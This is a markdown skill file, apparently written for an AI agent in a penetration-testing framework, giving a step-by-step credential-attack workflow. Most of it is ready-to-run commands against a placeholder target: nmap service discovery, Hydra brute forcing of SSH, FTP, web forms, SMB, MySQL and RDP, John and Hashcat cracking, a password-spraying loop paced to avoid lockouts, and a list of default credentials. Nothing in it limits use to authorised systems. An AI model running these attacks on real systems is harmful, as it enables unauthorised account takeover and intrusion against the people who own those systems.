# Password Attacks Skill

Credential brute forcing and hash cracking.

## Trigger

Use when you need to brute force credentials, crack password hashes, or perform credential attacks.

## Workflow

### Phase 1: Identify Attack Surface

1. **Network services**:
   ```bash
   nmap -sV -p 21,22,23,25,80,443,445,3306,3389,5432 TARGET
   ```

2. **Credential inputs**:
   - SSH, FTP, Telnet
   - Web login forms
   - Database ports
   - SMB shares

### Phase 2: Wordlist Preparation

**Common wordlists**:
```bash
# Usernames
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Usernames/Names/names.txt

# Passwords
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
/usr/share/seclists/Passwords/Common-Credentials/best1050.txt
```

**Custom wordlist generation**:
```bash
# Based on company name
echo "CompanyName" > custom.txt
echo "companyname" >> custom.txt
echo "Company123" >> custom.txt
echo "Company2024!" >> custom.txt

# Using cewl for website
cewl http://TARGET -m 5 -w custom_words.txt
```

### Phase 3: Brute Force Attacks (Hydra)

**SSH**:
```bash
hydra -L users.txt -P passwords.txt TARGET ssh -t 4 -V
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET ssh -t 4
```

**FTP**:
```bash
hydra -L users.txt -P passwords.txt TARGET ftp -V
hydra -l anonymous -p anonymous TARGET ftp
```

**HTTP Basic Auth**:
```bash
hydra -L users.txt -P passwords.txt TARGET http-get /admin
```

**HTTP POST Form**:
```bash
hydra -L users.txt -P passwords.txt TARGET http-post-form "/login:username=^USER^&password=^PASS^:Invalid" -V
```

**SMB**:
```bash
hydra -L users.txt -P passwords.txt TARGET smb -V
```

**MySQL**:
```bash
hydra -L users.txt -P passwords.txt TARGET mysql -V
```

**RDP**:
```bash
hydra -L users.txt -P passwords.txt TARGET rdp -V
```

### Phase 4: Hash Cracking

**Identify hash type**:
```bash
# Use hashid or hash-identifier
hashid "HASH_STRING"
hash-identifier
```

**John the Ripper**:
```bash
# Auto-detect hash type
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Specify format
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt
```

**Hashcat** (faster with GPU):
```bash
# MD5
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# SHA256
hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt

# NTLM
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# bcrypt
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

# Common hashcat modes:
# 0 = MD5
# 100 = SHA1
# 1400 = SHA256
# 1800 = SHA512crypt (Unix)
# 500 = MD5crypt (Unix)
# 1000 = NTLM
# 3200 = bcrypt
# 13100 = Kerberos TGS
```

**Hashcat rules**:
```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Phase 5: Password Spraying

**Avoid lockouts**:
```bash
# One password across many users (slow and careful)
for user in $(cat users.txt); do
    hydra -l "$user" -p "Password123" TARGET ssh -t 1 -W 30
    sleep 60  # Wait between attempts
done
```

### Phase 6: Default Credentials

Check for common defaults:
- admin:admin
- admin:password
- root:root
- root:toor
- administrator:administrator
- guest:guest

## Tools
- hydra
- john
- hashcat
- medusa
- ncrack
- cewl

## Record Findings

Use `record_finding` for:
- Weak or default credentials found
- Successfully cracked passwords
- Password policy weaknesses (no lockout, weak complexity)
